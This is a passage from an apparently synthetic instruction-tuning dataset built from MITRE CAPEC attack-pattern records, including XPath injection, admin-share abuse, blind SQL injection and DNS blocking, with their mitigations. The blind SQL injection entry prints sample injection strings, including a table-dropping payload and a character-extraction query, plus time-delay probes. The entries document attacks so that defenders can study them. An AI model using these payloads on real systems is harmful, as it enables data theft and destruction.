            "Implementation: Use SSL/TLS to protect cookie in transit",
            "Implementation: Ensure the web server implements all relevant security patches, many exploitable buffer overflows are fixed in patches issued for the software."
          ]
        },
        "Example_Instances": {
          "Example": "There are two main attack vectors for exploiting poorly protected session variables like cookies. One is the local machine itself which can be exploited directly at the physical level or indirectly through XSS and phishing. In addition, the adversary in the middle attack (CAPEC-94) relies on a network sniffer, proxy, or other intermediary to intercept the subject's credentials and use them to impersonate the digital subject on the host. The issue is that once the credentials are intercepted, impersonation is trivial for the adversary to accomplish if no other protection mechanisms are in place. See also: CVE-2010-5148 , CVE-2016-0353"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "565"
            },
            {
              "@CWE_ID": "302"
            },
            {
              "@CWE_ID": "311"
            },
            {
              "@CWE_ID": "113"
            },
            {
              "@CWE_ID": "539"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "315"
            },
            {
              "@CWE_ID": "384"
            },
            {
              "@CWE_ID": "472"
            },
            {
              "@CWE_ID": "602"
            },
            {
              "@CWE_ID": "642"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1539",
            "Entry_Name": "Steal Web Session Cookie"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Example_Instances, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'XPath Injection (CAPEC ID: 83)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.",
      "@Name": "XPath Injection (CAPEC ID: 83)",
      "attack_ptrn": {
        "@ID": "83",
        "@Name": "XPath Injection",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker can craft special user-controllable input consisting of XPath expressions to inject the XML database and bypass authentication or glean information that they normally would not be able to. XPath Injection enables an attacker to talk directly to the XML database, thus bypassing the application completely. XPath Injection results from the failure of an application to properly sanitize input used as part of dynamic XPath expressions used to query an XML database.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "250"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the target] Using a browser or an automated tool, an adversary records all instances of user-controllable input used to contruct XPath queries.",
              "Technique": [
                "Use an automated tool to record all instances of user-controllable input used to contruct XPath queries.",
                "Use a browser to manually explore the website and analyze how the application processes inputs."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Determine the tructure of queries] Using manual or automated means, test inputs found for XPath weaknesses.",
              "Technique": [
                "Use an automated tool automatically probe the inputs for XPath weaknesses.",
                "Manually probe the inputs using characters such as single quote (') that can cause XPath-releated errors, thus indicating an XPath weakness."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Inject content into XPath query] Craft malicious content containing XPath expressions that is not validated by the application and is executed as part of the XPath queries.",
              "Technique": [
                "Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.",
                "Use a combination of single quote (') and boolean expressions such as \"or 1=1\" to manipulate XPath logic.",
                "Use XPath functions in the malicious content such as \"string-length\", \"substring\", or \"count\" to gain information about the XML document structure being used."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "XPath queries used to retrieve information stored in XML documents",
            "User-controllable input not properly sanitized before being used as part of XPath queries"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "XPath Injection shares the same basic premises with SQL Injection. An attacker must have knowledge of XPath syntax and constructs in order to successfully leverage XPath Injection"
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Indicators": {
          "Indicator": "Too many exceptions generated by the application as a result of malformed XPath queries"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XPath expression. Characters such as a single-quote(') or operators such as or (|), and (&) and such should be filtered if the application does not expect them in the context in which they appear. If such content cannot be filtered, it must at least be properly escaped to avoid them being interpreted as part of XPath expressions.",
            "Use of parameterized XPath queries - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails.",
            "Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application."
          ]
        },
        "Example_Instances": {
          "Example": "Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "91"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "707"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "39",
              "Entry_Name": "XPath Injection"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Blind XPath Injection"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "XPATH Injection"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-611",
            "@Section": "Testing for XPATH Injection"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Description Summary, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Windows Admin Shares with Stolen Credentials (CAPEC ID: 561)",
    "context": "",
    "output": "APT32 has leveraged Windows' built-in Net utility to use Windows Administrative Shares to copy and execute remote malware. [REF-579]\nIn May 2017, APT15 laterally moved within a Windows domain via Windows Administrative Shares to copy files to and from compromised host systems. This further allowed for the remote execution of malware. [REF-578]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "APT32 has leveraged Windows' built-in Net utility to use Windows Administrative Shares to copy and execute remote malware. [REF-579]",
        "In May 2017, APT15 laterally moved within a Windows domain via Windows Administrative Shares to copy files to and from compromised host systems. This further allowed for the remote execution of malware. [REF-578]"
      ],
      "@Name": "Windows Admin Shares with Stolen Credentials (CAPEC ID: 561)",
      "attack_ptrn": {
        "@ID": "561",
        "@Name": "Windows Admin Shares with Stolen Credentials",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary guesses or obtains (i.e. steals or purchases) legitimate Windows administrator credentials (e.g. userID/password) to access Windows Admin Shares on a local machine or within a Windows domain.",
        "Extended_Description": {
          "xhtml:p": "Windows systems within the Windows NT family contain hidden network shares that are only accessible to system administrators. These shares allow administrators to remotely access all disk volumes on a network-connected system and further allow for files to be copied, written, and executed, along with other administrative actions. Example network shares include: C$, ADMIN$ and IPC$. If an adversary is able to obtain legitimate Windows credentials, the hidden shares can be accessed remotely, via server message block (SMB) or the Net utility, to transfer files and execute code. It is also possible for adversaries to utilize NTLM hashes to access administrator shares on systems with certain configuration and patch levels."
        },
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "653"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "165"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "549"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "545"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Acquire known Windows administrator credentials] The adversary must obtain known Windows administrator credentials in order to access the administrative network shares.",
              "Technique": [
                "An adversary purchases breached Windows administrator credentials from the dark web.",
                "An adversary leverages a key logger or phishing attack to steal administrator credentials as they are provided.",
                "An adversary conducts a sniffing attack to steal Windows administrator credentials as they are transmitted.",
                "An adversary gains access to a Windows domain system/files and exfiltrates Windows administrator password hashes.",
                "An adversary examines outward-facing configuration and properties files to discover hardcoded Windows administrator credentials."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt domain authentication] Try each Windows administrator credential against the hidden network shares until the target grants access.",
              "Technique": "Manually or automatically enter each administrator credential through the target's interface."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Malware Execution] An adversary can remotely execute malware within the administrative network shares to infect other systems within the domain."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Data Exfiltration] The adversary can remotely obtain sensitive data contained within the administrative network shares."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system/application is connected to the Windows domain.",
            "The target administrative share allows remote use of local admin credentials to log into domain systems.",
            "The adversary possesses a list of known Windows administrator credentials that exist on the target domain."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Once an adversary obtains a known Windows credential, leveraging it is trivial."
          }
        },
        "Resources_Required": {
          "Resource": "A list of known Windows administrator credentials for the targeted domain."
        },
        "Indicators": {
          "Indicator": [
            "Data is being transferred and/or removed from administrative network shares.",
            "Suspicious or Malicious software is executed within administrative network shares.",
            "Suspicious or Malicious software is downloaded/installed on systems within the domain."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Authorization"
              ],
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Do not reuse local administrator account credentials across systems.",
            "Deny remote use of local admin credentials to log into domain systems.",
            "Do not allow accounts to be a local administrator on more than one system."
          ]
        },
        "Example_Instances": {
          "Example": [
            "APT32 has leveraged Windows' built-in Net utility to use Windows Administrative Shares to copy and execute remote malware. [REF-579]",
            "In May 2017, APT15 laterally moved within a Windows domain via Windows Administrative Shares to copy files to and from compromised host systems. This further allowed for the remote execution of malware. [REF-578]"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            },
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "521"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1021.002",
            "Entry_Name": "Remote Services:SMB/Windows Admin Shares"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-577"
            },
            {
              "@External_Reference_ID": "REF-578"
            },
            {
              "@External_Reference_ID": "REF-579"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Consequences, Description, Example_Instances, Execution_Flow, Indicators, Mitigations, Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Skills_Required, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Blind SQL Injection (CAPEC ID: 7)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Blind SQL Injection (CAPEC ID: 7) are: In the PHP application TimeSheet 1.1, an adversary can successfully retrieve username and password hashes from the database using Blind SQL Injection. If the adversary is aware of the local path structure, the adversary can also remotely execute arbitrary code and write the output of the injected queries to the local path. Blind SQL Injection is possible since the application does not properly sanitize the $_POST['username'] variable in the login.php file. See also: CVE-2006-4705",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "In the PHP application TimeSheet 1.1, an adversary can successfully retrieve username and password hashes from the database using Blind SQL Injection. If the adversary is aware of the local path structure, the adversary can also remotely execute arbitrary code and write the output of the injected queries to the local path. Blind SQL Injection is possible since the application does not properly sanitize the $_POST['username'] variable in the login.php file. See also: CVE-2006-4705"
      ],
      "@Name": "Blind SQL Injection (CAPEC ID: 7)",
      "attack_ptrn": {
        "@ID": "7",
        "@Name": "Blind SQL Injection",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "Blind SQL Injection results from an insufficient mitigation for SQL Injection. Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection. Blind SQL Injection is a form of SQL Injection that overcomes the lack of error messages. Without the error messages that facilitate SQL Injection, the adversary constructs input strings that probe the target through simple Boolean SQL expressions. The adversary can determine if the syntax and structure of the injection was successful based on whether the query was executed or not. Applied iteratively, the adversary determines how and where the target is vulnerable to SQL Injection.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "66"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": {
                "xhtml:p": [
                  "Generated hypotheses regarding the SQL queries in an application. For example, the adversary may hypothesize that their input is passed directly into a query that looks like:",
                  "Of course, there are many other possibilities."
                ],
                "xhtml:div": {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "xhtml:br": [
                    null,
                    null,
                    null,
                    null
                  ],
                  "#text": "\"SELECT * FROM orders WHERE ordernum = _____\"or\"SELECT * FROM orders WHERE ordernum IN (_____)\"or\"SELECT * FROM orders WHERE ordernum in (_____) ORDER BY _____\""
                },
                "#text": "[Hypothesize SQL queries in application]"
              },
              "Technique": "Research types of SQL queries and determine which ones could be used at various places in an application."
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": {
                "xhtml:p": "Determine how to inject information into the queries from the previous step such that the injection does not impact their logic. For example, the following are possible injections for those queries:",
                "xhtml:div": {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "xhtml:br": [
                    null,
                    null,
                    null,
                    null
                  ],
                  "#text": "\"5' OR 1=1; --\"and\"5) OR 1=1; --\"and\"ordernum DESC; --\""
                },
                "#text": "[Determine how to inject information into the queries]"
              },
              "Technique": [
                "Add clauses to the SQL queries such that the query logic does not change.",
                "Add delays to the SQL queries in case server does not provide clear error messages (e.g. WAITFOR DELAY '0:0:10' in SQL Server or BENCHMARK(1000000000,MD5(1) in MySQL). If these can be injected into the queries, then the length of time that the server takes to respond reveals whether the query is injectable or not."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the adversary suspects is vulnerable to SQL injection, attempt to inject the values determined in the previous step. If an error does not occur, then the adversary knows that the SQL injection was successful.",
              "Technique": [
                "Use web browser to inject input through text fields or through HTTP GET parameters.",
                "Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.",
                "Use network-level packet injection tools such as netcat to inject input",
                "Use modified client (modified by reverse engineering) to inject input."
              ]
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Determine database type] Determines the type of the database, such as MS SQL Server or Oracle or MySQL, using logical conditions as part of the injected queries",
              "Technique": [
                "Try injecting a string containing char(0x31)=char(0x31) (this evaluates to 1=1 in SQL Server only)",
                "Try injecting a string containing 0x313D31 (this evaluates to 1=1 in MySQL only)",
                "Inject other database-specific commands into input fields susceptible to SQL Injection. The adversary can determine the type of database that is running by checking whether the query executed successfully or not (i.e. whether the adversary received a normal response from the server or not)."
              ]
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Extract information about database schema] Extract information about database schema by getting the database to answer yes/no questions about the schema.",
              "Technique": [
                "Automatically extract database schema using a tool such as Absinthe.",
                "Manually perform the blind SQL Injection to extract desired information about the database schema."
              ]
            },
            {
              "Step": "6",
              "Phase": "Exploit",
              "Description": "[Exploit SQL Injection vulnerability] Use the information obtained in the previous steps to successfully inject the database in order to bypass checks or modify, add, retrieve or delete data from the database",
              "Technique": "Use information about how to inject commands into SQL queries as well as information about the database schema to execute attacks such as dropping tables, inserting records, etc."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "SQL queries used by the application to store, retrieve or modify data.",
            "User-controllable input that is not properly validated by the application as part of SQL queries."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Determining the database type and version, as well as the right number and type of parameters to the query being injected in the absence of error messages requires greater skill than reverse-engineering database error messages."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Indicators": {
          "Indicator": "The only indicators of successful Blind SQL Injection are the application or database logs that show similar queries with slightly differing logical conditions that increase in complexity over time. However, this requires extensive logging as well as knowledge of the queries that can be used to perform such injection and return meaningful information from the database."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Security by Obscurity is not a solution to preventing SQL Injection. Rather than suppress error messages and exceptions, the application must handle them gracefully, returning either a custom error page or redirecting the user to a default page, without revealing any information about the database or the application internals.",
            "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": [
                "An adversary may try entering something like \"username' AND 1=1; --\" in an input field. If the result is the same as when the adversary entered \"username\" in the field, then the adversary knows that the application is vulnerable to SQL Injection. The adversary can then ask yes/no questions from the database server to extract information from it. For example, the adversary can extract table names from a database using the following types of queries:",
                "If the above query executes properly, then the adversary knows that the first character in a table name in the database is a letter between m and z. If it doesn't, then the adversary knows that the character must be between a and l (assuming of course that table names only contain alphabetic characters). By performing a binary search on all character positions, the adversary can determine all table names in the database. Subsequently, the adversary may execute an actual attack and send something like:"
              ],
              "xhtml:div": [
                {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "#text": "\"username' AND ascii(lower(substring((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 108\"."
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "#text": "\"username'; DROP TABLE trades; --"
                }
              ]
            },
            "In the PHP application TimeSheet 1.1, an adversary can successfully retrieve username and password hashes from the database using Blind SQL Injection. If the adversary is aware of the local path structure, the adversary can also remotely execute arbitrary code and write the output of the injected queries to the local path. Blind SQL Injection is possible since the application does not properly sanitize the $_POST['username'] variable in the login.php file. See also: CVE-2006-4705"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "89"
            },
            {
              "@CWE_ID": "209"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "697"
            },
            {
              "@CWE_ID": "707"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "OWASP Attacks",
            "Entry_Name": "Blind SQL Injection"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Description, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - DNS Blocking (CAPEC ID: 589)",
    "context": "",
    "output": "Full URL Based Filtering: Filtering based upon the requested URL.\nURL String-based Filtering: Filtering based upon the use of particular strings included in the requested URL.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Full URL Based Filtering: Filtering based upon the requested URL.",
        "URL String-based Filtering: Filtering based upon the use of particular strings included in the requested URL."
      ],
      "@Name": "DNS Blocking (CAPEC ID: 589)",
      "attack_ptrn": {
        "@ID": "589",
        "@Name": "DNS Blocking",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary intercepts traffic and intentionally drops DNS requests based on content in the request. In this way, the adversary can deny the availability of specific services or content to the user even if the IP address is changed.",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "603",
            "Exclude_Related": {
              "@Exclude_ID": "514"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "This attack requires the ability to conduct deep packet inspection with an In-Path device that can drop the targeted traffic and/or connection."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": "Other",
            "Note": "Preventing DNS from resolving a request denies the availability of a target site or service for the user."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Hard Coded Alternate DNS server in applications",
            "Avoid dependence on DNS",
            "Include \"hosts file\"/IP address in the application.",
            "Ensure best practices with respect to communications channel protections.",
            "Use a .onion domain with Tor support"
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "Full URL Based Filtering: Filtering based upon the requested URL.",
              "URL String-based Filtering: Filtering based upon the use of particular strings included in the requested URL."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "300"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-473"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "Seamus Tuohy",
            "Submission_Date": "2017-01-12"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Mitigations"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Malicious Logic Insertion into Product Software via Configuration Management Manipulation (CAPEC ID: 445)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Malicious Logic Insertion into Product Software via Configuration Management Manipulation (CAPEC ID: 445) are: In 2016, the policy-based configuration management system Chef was shown to be vulnerable to remote code execution attacks based on its Chef Manage add-on improperly deserializing user-driven cookie data. This allowed unauthenticated users the ability to craft cookie data that executed arbitrary code with the web server's privileges. [REF-706]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "In 2016, the policy-based configuration management system Chef was shown to be vulnerable to remote code execution attacks based on its Chef Manage add-on improperly deserializing user-driven cookie data. This allowed unauthenticated users the ability to craft cookie data that executed arbitrary code with the web server's privileges. [REF-706]",
      "@Name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation (CAPEC ID: 445)",
      "attack_ptrn": {
        "@ID": "445",
        "@Name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary exploits a configuration management system so that malicious logic is inserted into a software products build, update or deployed environment. If an adversary can control the elements included in a product's configuration management for build they can potentially replace, modify or insert code files containing malicious logic. If an adversary can control elements of a product's ongoing operational configuration management baseline they can potentially force clients receiving updates from the system to install insecure software when receiving updates from the server."
        },
        "Extended_Description": {
